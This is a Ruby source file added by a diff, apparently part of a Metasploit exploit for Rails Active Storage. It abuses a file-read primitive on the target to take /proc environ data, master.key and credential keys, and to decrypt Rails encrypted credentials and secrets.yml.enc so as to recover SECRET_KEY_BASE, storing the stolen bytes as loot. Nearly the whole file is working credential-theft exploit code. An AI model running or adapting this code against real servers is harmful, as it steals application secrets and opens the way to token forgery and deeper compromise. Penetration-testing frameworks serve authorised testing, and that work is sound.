+++ lib/msf/core/exploit/remote/http/rails_active_storage_vips/rails_secrets.rb
@@ -1,0 +1,336 @@
+# frozen_string_literal: true
+
+require 'base64'
+require 'openssl'
+require 'yaml'
+
+module Msf::Exploit::Remote::HTTP::RailsActiveStorageVips
+  # Helpers for recovering and decrypting Rails secret-key sources.
+  module RailsSecrets
+    ENVIRONMENT_PATHS = ['/proc/self/environ', '/proc/1/environ'].freeze
+    LOCAL_SECRET_PATHS = [
+      '/proc/self/cwd/tmp/local_secret.txt',
+      '/proc/self/cwd/tmp/development_secret.txt'
+    ].freeze
+    CREDENTIAL_ENVIRONMENTS = %w[production staging development test].freeze
+    MAX_YAML_DEPTH = 100
+
+    private
+
+    def recover_secret_key_base(context)
+      LOCAL_SECRET_PATHS.each do |path|
+        bytes = try_read_text_file(context, path, max_bytes: 512, filename: 'local_secret.png')
+        next unless bytes
+
+        candidate = validated_secret_candidate(trim_external_bytes(bytes), path, context[:representation][:signed_id])
+        return candidate if candidate
+      end
+
+      environments = []
+      ENVIRONMENT_PATHS.each do |path|
+        print_status("Reading up to #{datastore['EnvironmentMaxBytes']} bytes from #{path}")
+        partial = context[:mode] == :sharpened
+        validated_environment_secret = nil
+        bytes = try_read_text_file(
+          context,
+          path,
+          max_bytes: datastore['EnvironmentMaxBytes'],
+          filename: 'environment.png',
+          stop_when: lambda { |candidate_bytes|
+            environment_contains_usable_key?(candidate_bytes, path, context[:representation][:signed_id]) do |candidate|
+              validated_environment_secret = candidate
+            end
+          },
+          allow_partial: partial
+        )
+        next unless bytes
+
+        environment = parse_environment(bytes)
+        environments << [path, environment]
+        loot_path = store_loot(
+          partial ? 'rails.process.environ.partial' : 'rails.process.environ',
+          'application/octet-stream',
+          rhost,
+          bytes,
+          partial ? "#{::File.basename(path)}.partial.bin" : "#{::File.basename(path)}.bin",
+          partial ? "Partially recovered #{path}; uncertain bytes were replaced with NUL" : "Recovered #{path} bytes",
+          @active_storage_service || report_active_storage_service
+        )
+        print_status("Stored recovered environment bytes in: #{loot_path}")
+
+        return validated_environment_secret if validated_environment_secret
+
+        if environment['SECRET_KEY_BASE'].present?
+          candidate = validated_secret_candidate(environment['SECRET_KEY_BASE'], path, context[:representation][:signed_id])
+          return candidate if candidate
+        end
+      end
+
+      master_keys = environments.filter_map do |path, environment|
+        key = environment['RAILS_MASTER_KEY'].to_s.strip
+        [key, "RAILS_MASTER_KEY from #{path}"] if valid_master_key?(key)
+      end
+
+      credential_environments = environments.flat_map do |_path, environment|
+        [environment['RAILS_ENV'], environment['RACK_ENV']]
+      end
+      credential_environments = credential_environments.compact.select { |value| value.match?(/\A[a-zA-Z0-9_-]+\z/) }
+      credential_environments = (credential_environments + CREDENTIAL_ENVIRONMENTS).uniq
+
+      credential_environments.each do |environment|
+        key_path = "/proc/self/cwd/config/credentials/#{environment}.key"
+        bytes = try_read_text_file(context, key_path, max_bytes: 128, filename: "#{environment}_key.png")
+        next unless bytes
+
+        key = trim_external_bytes(bytes)
+        master_keys << [key, key_path] if valid_master_key?(key)
+      end
+
+      master_key_path = '/proc/self/cwd/config/master.key'
+      bytes = try_read_text_file(context, master_key_path, max_bytes: 128, filename: 'master_key.png')
+      if bytes
+        key = trim_external_bytes(bytes)
+        master_keys << [key, master_key_path] if valid_master_key?(key)
+      end
+      master_keys.uniq!(&:first)
+
+      credentials_paths = credential_environments.map do |environment|
+        "/proc/self/cwd/config/credentials/#{environment}.yml.enc"
+      end
+      credentials_paths << '/proc/self/cwd/config/credentials.yml.enc'
+
+      credentials_paths.uniq.each do |path|
+        encrypted = try_read_text_file(
+          context,
+          path,
+          max_bytes: datastore['CredentialsMaxBytes'],
+          filename: 'credentials.png'
+        )
+        next unless encrypted
+
+        encrypted = trim_external_bytes(encrypted)
+        master_keys.each do |master_key, key_source|
+          plaintext = decrypt_rails_credentials(encrypted, master_key)
+          next unless plaintext
+
+          secret = extract_secret_key_base_from_plaintext(plaintext)
+          next unless secret
+
+          candidate = validated_secret_candidate(secret, "#{path} using #{key_source}", context[:representation][:signed_id])
+          return candidate if candidate
+        end
+      end
+
+      legacy_secret = recover_legacy_secrets(context, credential_environments, master_keys)
+      return legacy_secret if legacy_secret
+
+      keys = environments.flat_map { |_path, environment| environment.keys }.uniq.sort
+      raise TriggerError, "Could not recover SECRET_KEY_BASE from Rails local secrets, environment, encrypted credentials, or legacy secrets.yml (environment keys: #{keys.join(', ')})"
+    end
+
+    # Rails 6.0-7.1 fall back to Rails.application.secrets.secret_key_base, read from
+    # the plaintext config/secrets.yml or the encrypted config/secrets.yml.enc. The
+    # encrypted file uses ActiveSupport::MessageEncryptor with the same aes-128-gcm
+    # envelope as credentials, but serializes the YAML through Marshal and is keyed by
+    # config/secrets.yml.key or RAILS_MASTER_KEY. Both files are environment-keyed.
+    def recover_legacy_secrets(context, environments, master_keys)
+      plaintext_path = '/proc/self/cwd/config/secrets.yml'
+      bytes = try_read_text_file(context, plaintext_path, max_bytes: datastore['CredentialsMaxBytes'], filename: 'secrets.png')
+      if bytes
+        secret_key_base_candidates_from_secrets_yaml(trim_external_bytes(bytes), environments).each do |secret|
+          candidate = validated_secret_candidate(secret, plaintext_path, context[:representation][:signed_id])
+          return candidate if candidate
+        end
+      end
+
+      encrypted_path = '/proc/self/cwd/config/secrets.yml.enc'
+      encrypted = try_read_text_file(context, encrypted_path, max_bytes: datastore['CredentialsMaxBytes'], filename: 'secrets_enc.png')
+      return nil unless encrypted
+
+      encrypted = trim_external_bytes(encrypted)
+      legacy_secrets_keys(context, master_keys).each do |key, key_source|
+        plaintext = decrypt_rails_credentials(encrypted, key)
+        next unless plaintext
+
+        secret_key_base_candidates_from_secrets_yaml(unwrap_marshaled_string(plaintext), environments).each do |secret|
+          candidate = validated_secret_candidate(secret, "#{encrypted_path} using #{key_source}", context[:representation][:signed_id])
+          return candidate if candidate
+        end
+      end
+      nil
+    end
+
+    def legacy_secrets_keys(context, master_keys)
+      keys = master_keys.dup
+      secrets_key_path = '/proc/self/cwd/config/secrets.yml.key'
+      bytes = try_read_text_file(context, secrets_key_path, max_bytes: 128, filename: 'secrets_key.png')
+      if bytes
+        key = trim_external_bytes(bytes)
+        keys << [key, secrets_key_path] if valid_master_key?(key)
+      end
+      keys.uniq(&:first)
+    end
+
+    def secret_key_base_candidates_from_secrets_yaml(yaml, environments)
+      document = safe_load_yaml_document(yaml, aliases: true)
+      return [] unless document.is_a?(Hash)
+
+      shared = document['shared'].is_a?(Hash) ? document['shared'] : {}
+      environments = ['development'] if environments.empty?
+      sections = environments.uniq.map do |environment|
+        environment_secrets = document[environment]
+        environment_secrets = {} unless environment_secrets.is_a?(Hash)
+        shared.merge(environment_secrets)
+      end
+
+      sections << document
+      sections.filter_map do |section|
+        secret = section['secret_key_base']
+        secret if secret.is_a?(String) && secret.present? && !secret.include?('<%')
+      end.uniq
+    end
+
+    def safe_load_yaml_document(yaml, aliases:)
+      return unless yaml.is_a?(String)
+
+      # Psych's safe loader can exhaust the Ruby stack before it constructs a
+      # target-controlled document. Inspect its AST iteratively first so deeply
+      # nested YAML is rejected without recursively walking the node tree.
+      stream = Psych.parse_stream(yaml)
+      pending = stream.children.map { |node| [node, 1] }
+      until pending.empty?
+        node, depth = pending.pop
+        return if depth > MAX_YAML_DEPTH
+
+        Array(node.children).each { |child| pending << [child, depth + 1] }
+      end
+
+      YAML.safe_load(
+        yaml,
+        permitted_classes: [],
+        permitted_symbols: [],
+        aliases: aliases
+      )
+    rescue Psych::Exception, SystemStackError
+      nil
+    end
+
+    def environment_contains_complete_key?(bytes)
+      %w[SECRET_KEY_BASE RAILS_MASTER_KEY].any? do |key|
+        bytes.match?(/(?:\A|\x00)#{Regexp.escape(key)}=[^\x00]*\x00/n)
+      end
+    end
+
+    def environment_contains_usable_key?(bytes, source, signed_id)
+      return false unless environment_contains_complete_key?(bytes)
+
+      environment = parse_environment(bytes)
+      if environment['SECRET_KEY_BASE'].present?
+        candidate = validated_secret_candidate(environment['SECRET_KEY_BASE'], source, signed_id)
+        if candidate
+          yield candidate if block_given?
+          return true
+        end
+      end
+
+      false
+    end
+
+    def parse_environment(bytes)
+      bytes.split("\x00").each_with_object({}) do |entry, environment|
+        next unless entry.include?('=')
+
+        key, value = entry.split('=', 2)
+        environment[key] = value
+      end
+    end
+
+    def trim_external_bytes(bytes)
+      bytes.split("\x00", 2).first.to_s.strip
+    end
+
+    def validated_secret_candidate(secret, source, signed_id)
+      secret = validate_secret_key_base(secret)
+      token_info = signed_token_info(signed_id)
+      key_generator_digest = key_generator_digest_for(secret, token_info)
+      [secret, source, key_generator_digest, token_info]
+    rescue TriggerError => e
+      vprint_status("Skipping #{source} secret candidate: #{e.message}")
+      nil
+    end
+
+    def validate_secret_key_base(secret)
+      raise TriggerError, 'SECRET_KEY_BASE was empty' if secret.blank?
+
+      secret
+    end
+
+    def valid_master_key?(key)
+      key.match?(/\A[0-9a-f]{32}\z/i)
+    end
+
+    def decrypt_rails_credentials(encrypted, master_key)
+      return nil unless valid_master_key?(master_key.to_s.strip)
+
+      parts = encrypted.split('--')
+      return nil unless parts.length == 3
+
+      ciphertext, iv, auth_tag = parts.map { |part| Base64.strict_decode64(part) }
+      return nil unless iv.bytesize == 12 && auth_tag.bytesize == 16
+
+      cipher = OpenSSL::Cipher.new('aes-128-gcm')
+      cipher.decrypt
+      cipher.key = [master_key.to_s.strip].pack('H*')
+      cipher.iv = iv
+      cipher.auth_tag = auth_tag
+      cipher.auth_data = ''
+      cipher.update(ciphertext) + cipher.final
+    rescue OpenSSL::Cipher::CipherError, ArgumentError
+      nil
+    end
+
+    def extract_secret_key_base_from_plaintext(plaintext)
+      document = safe_load_yaml_document(unwrap_marshaled_string(plaintext), aliases: false)
+      return nil unless document.is_a?(Hash)
+
+      secret = document['secret_key_base']
+      return nil unless secret.is_a?(String) && secret.present?
+
+      validate_secret_key_base(secret)
+    end
+
+    # ActiveSupport::EncryptedFile may wrap the YAML in a Marshal string. Decode
+    # only that primitive envelope; never Marshal.load target-controlled bytes.
+    # Format reference: https://github.com/ruby/ruby/blob/master/doc/marshal/marshal.md
+    def unwrap_marshaled_string(data)
+      return data unless data.start_with?("\x04\x08".b)
+
+      offset = 2
+      offset += 1 if data.getbyte(offset) == 0x49
+      return data unless data.getbyte(offset) == 0x22
+
+      length, offset = parse_marshaled_length(data, offset + 1)
+      return data if length.nil?
+
+      value = data.byteslice(offset, length)
+      value&.bytesize == length ? value : data
+    end
+
+    def parse_marshaled_length(data, offset)
+      encoded = data.getbyte(offset)
+      return [nil, offset] unless encoded
+
+      encoded -= 256 if encoded > 127
+      offset += 1
+      return [0, offset] if encoded.zero?
+      return [encoded - 5, offset] if encoded > 4
+      return [nil, offset] if encoded.negative?
+
+      bytes = data.byteslice(offset, encoded)
+      return [nil, offset] unless bytes&.bytesize == encoded
+
+      length = bytes.bytes.each_with_index.sum { |byte, index| byte << (8 * index) }
+      [length, offset + encoded]
+    end
+  end
+end
